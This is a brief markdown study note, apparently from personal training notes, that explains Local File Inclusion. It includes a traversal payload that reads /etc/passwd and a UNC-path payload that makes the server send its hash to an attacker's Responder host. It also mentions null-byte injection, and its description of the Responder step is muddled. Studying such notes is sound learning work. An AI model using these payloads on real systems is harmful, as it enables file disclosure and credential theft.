---
share: true
---

```markdown
# Note: Local File Inclusion (LFI) Vulnerability

## Definition

- **Local File Inclusion (LFI)** is a vulnerability that allows an attacker to include files located on the same server as the web application.
- This can lead to information disclosure, code execution, or further exploitation.

## How LFI is Exploited

- The attacker manipulates a file path parameter (often in the URL or a form) to include arbitrary files from the server.
- Example of a vulnerable URL parameter:
  ```
  http://target-site.com/?page=about.php
  ```
- An attacker might try:
  ```
  http://target-site.com/?page=../../../../etc/passwd
  ```

## Example: Using LFI to Retrieve a Hash Captured by Responder

- If you have captured a hash with Responder and want to retrieve it via LFI, you can try:
  ```
  [target_url]/?page=//10.10.15.54/share
  ```
  - Replace `10.10.15.54` with the IP of your Responder server and `share` with the name of the shared resource.

## Tips

- LFI can be used to read sensitive files like `/etc/passwd`, web server logs, or application source code.
- Sometimes, you can use LFI to include files from network shares (SMB, NFS) if the server allows it.
- Always test for directory traversal (`../`) and null byte injection (`%00`) if possible.

---

**Summary:**  
LFI lets attackers include and read files from the local server by manipulating file path parameters.  
It can be used to retrieve sensitive data or interact with tools like Responder for further exploitation.

```